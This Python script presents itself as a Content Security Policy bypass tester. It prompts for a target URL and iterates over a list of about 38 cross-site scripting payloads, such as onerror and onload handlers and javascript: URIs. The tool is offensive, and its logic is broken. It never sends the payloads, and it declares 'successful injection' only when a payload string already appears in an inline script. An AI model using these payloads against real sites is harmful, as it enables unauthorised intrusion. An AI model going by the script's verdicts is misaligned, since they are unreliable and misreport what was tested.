import requests
from bs4 import BeautifulSoup

# List of payloads to test for CSP bypass
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'></embed>",
    "<form action='javascript:alert(1)'><input type='submit'></form>",
    "<img src='nonexistent' onerror='alert(1)'>",
    "<audio src onerror=alert(1)>",
    "<video src onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<blink onstart=alert(1)>",
    "<script xlink:href='data:text/javascript,alert(1)'></script>",
    "<svg><a xlink:href='javascript:alert(1)'>test</a></svg>",
    "<details open ontoggle=alert(1)>",
    "<bgsound src='javascript:alert(1)'>",
    "<frame src='javascript:alert(1)'>",
    "<plaintext>",
    "<xss id=x onfocus=alert(1) tabindex=1></xss>",
    "<keygen onfocus=alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<command type=image src=1 onerror=alert(1)>",
    "<img src='data:image/png;base64,invalid' onerror=alert(1)>",
    "<div style='width: expression(alert(1));'></div>",
    "<input type=text onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus></textarea>",
    "<select onfocus=alert(1) autofocus><option></option></select>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<form><button formaction='javascript:alert(1)'>Click</button></form>",
    "<math><mtext onclick=alert(1)>Click me</mtext></math>",
    "<wbr title='javascript:alert(1)'>Click me</wbr>",
    "<base href='javascript:alert(1)//'>",
    "<object type='text/html' data='javascript:alert(1)'></object>",
    "<a style='url(javascript:alert(1))'>Click me</a>",
    "<img src='x' srcset='x 1x, javascript:alert(1) 2x'>"
]

# Assign payloads to variables
for i, payload in enumerate(payloads, 1):
    globals()[f'CSP{i}'] = payload

# Function to test CSP bypass for a given URL and payload
def test_csp_bypass(url, payload):
    print("[*] Testing Content Security Policy (CSP) Bypass with payload:", payload)
    
    # Send a GET request to the target URL
    response = requests.get(url)
    print("[*] Sending GET request to:", url)
    
    # Parse the response HTML
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Check if CSP is present in the response headers
    if 'content-security-policy' in response.headers:
        print("[*] Content Security Policy (CSP) found in response headers.")
        csp_header = response.headers['content-security-policy']
        print("[*] Content Security Policy (CSP) Header:", csp_header)
        
        # Check if 'unsafe-inline' is present in CSP header
        if "'unsafe-inline'" in csp_header:
            print("[!] Target website is potentially vulnerable to CSP bypass.")
            
            # Extract URLs with 'unsafe-inline' from HTML content
            inline_scripts = soup.find_all('script', attrs={'src': False})
            for script in inline_scripts:
                if script.text.strip() != "":
                    print("[*] Potentially bypassable inline script found:", script.text.strip())
                    # Inject payload and check for success
                    if payload in script.text:
                        return True, 'high'
        else:
            print("[*] Content Security Policy (CSP) does not contain 'unsafe-inline'.")
            print("[*] Target website is not vulnerable to CSP bypass.")
            return False, 'low'
    else:
        print("[!] Content Security Policy (CSP) not found in response headers.")
        print("[*] Target website may or may not be vulnerable to CSP bypass.")
        return False, 'medium'

# Main function to execute the program
def run_csp_bypass_test():
    print("Content Security Policy (CSP) Bypass Tester")
    target_url = input("[*] Enter your target website URL: ")

    successful_payload = None
    vulnerability_metric = 'low'
    
    for i in range(1, len(payloads) + 1):
        payload_var = globals()[f'CSP{i}']
        is_vulnerable, metric = test_csp_bypass(target_url, payload_var)
        if is_vulnerable:
            successful_payload = payload_var
            vulnerability_metric = metric
            print(f"[*] Successfully injected payload: {payload_var}")
            print(f"[*] Payload variable name: CSP{i}")
            print(f"[*] Vulnerability metric: {metric}")
            break

    if successful_payload:
        print(f"\n[+] Final Report:")
        print(f"[*] Successfully injected payload: {successful_payload}")
        print(f"[*] Payload variable name: {globals()[f'CSP{i}']}")
        print(f"[*] Vulnerability metric: {vulnerability_metric}")
    else:
        print("[*] No payloads were successfully injected.")

# Execute the main function
if __name__ == "__main__":
    run_csp_bypass_test()
